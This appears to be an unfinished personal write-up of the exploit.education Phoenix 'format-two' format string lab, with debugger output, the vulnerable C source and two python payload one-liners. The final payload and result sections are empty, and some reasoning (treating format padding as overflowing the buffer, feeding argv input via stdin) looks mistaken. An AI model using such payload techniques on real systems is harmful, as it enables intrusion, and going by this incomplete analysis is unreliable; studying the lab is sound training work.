# Phoenix format-two
https://exploit.education/phoenix/format-two/
### Result

### Setup

### Compile code
This is a `format string` challenge using `printf`.

Like the previous challenges with `sprintf`, the compiler warns `format not a string literal and no format arguments [-Wformat-security]`.  It it referencing this code:
```
void bounce(char *str) {
  printf(str);
}
```

### Reversing
This challenge uses more C APIs than previous `format string` challenges.

```
radare2 -A format_two

[0x00400520]> ii
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x004004d0 GLOBAL FUNC       strncpy
2   0x004004e0 GLOBAL FUNC       puts
3   0x004004f0 GLOBAL FUNC       printf
4   0x00400500 GLOBAL FUNC       memset
7   0x00400510 GLOBAL FUNC       exit
```

##### Find size of buffer
If you `disassemble main` you can set `memset` is called first.

> void *memset(void *b, int c, size_t len);

If you break on that call, you can get two useful things; the address of `buffer` and the `length` of the buffer.
```
memset@plt (
   $rdi = 0x00007fffffffe450 → 0x0000000000000000,
   $rsi = 0x0000000000000000,
   $rdx = 0x0000000000000100,
   $rcx = 0x00007ffff7af4154 → 0x5477fffff0003d48 ("H="?)
)
```
The third value, the buffer length is represented in hex.  You can see the `buffer` is `256` chars long.
```
gef➤  p/d 0x100
$4 = 256
```
##### Limiting len of user input
Well, not really. But we can check another way.  The second API called is `strncpy`.  This is less famous than `strcpy` which doesn't have that `len` argument to mitigate buffer overflows:

> char * strncpy(char * dst, const char * src, size_t len);

Sidenote - the `memset` call is redundant.  As `strncpy` sets the unused memory to all zeros:

> .... strncpy() functions copy at most len characters from
> src into dst.  If src is less than len characters long, the remainder of
> dst is filled with `\0` characters.

So if we break on `strncpy`.  It was passed:
```
strncpy@plt (
   $rdi = 0x00007fffffffe450 → 0x0000000000000000,
   $rsi = 0x00007fffffffe862 → 0x53454c0041414141 ("AAAA"?),
   $rdx = 0x0000000000000100  <-- 256 char buffer
)
```
That re-confirms the address of the buffer and it's length of `256` characters.

### Payloads
##### inspecting printf()
We can inject `format arguments` to try and take the `buffer` beyond `256` characters, using our user input ( which routes the input via `strncpy` ).

```
gef➤  disas bounce
0x000000000040061f <+24>:	call   0x4004f0 <printf@plt>

gef➤  b *bounce+24

printf@plt (
   $rdi = 0x00007fffffffe450 → 0x0000000041414141 ("AAAA"?),
   $rsi = 0x00007fffffffe862 → 0x53454c0041414141 ("AAAA"?),
   $rdx = 0x0000000000000000
)
```
##### Get stack size
`set $stack_size = $rbp - $rsp`         # 272
##### Calculate max overflow
`p/d $stack_size -256`                  # 16
##### Create first payload
```
python -c 'print "%256x" + "\x41\x41\x41\x41"' > payload.txt
gef➤  r < payload.txt
Better luck next time!
```
##### Create second payload
```
python -c 'print "%268x" + "\x41\x41\x41\x41"' > payload.txt
```
### Result
##### Create final payload


### Source code
```
 /*
 * Can you change the "changeme" variable?
 */

 #include <err.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>

 #define BANNER \
   "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

 int changeme;

 void bounce(char *str) {
   printf(str);
 }

 int main(int argc, char **argv) {
   char buf[256];

   printf("%s\n", BANNER);

   if (argc > 1) {
     memset(buf, 0, sizeof(buf));
     strncpy(buf, argv[1], sizeof(buf));
     bounce(buf);
   }

   if (changeme != 0) {
     puts("Well done, the 'changeme' variable has been changed correctly!");
   } else {
     puts("Better luck next time!\n");
   }

   exit(0);
 }
```
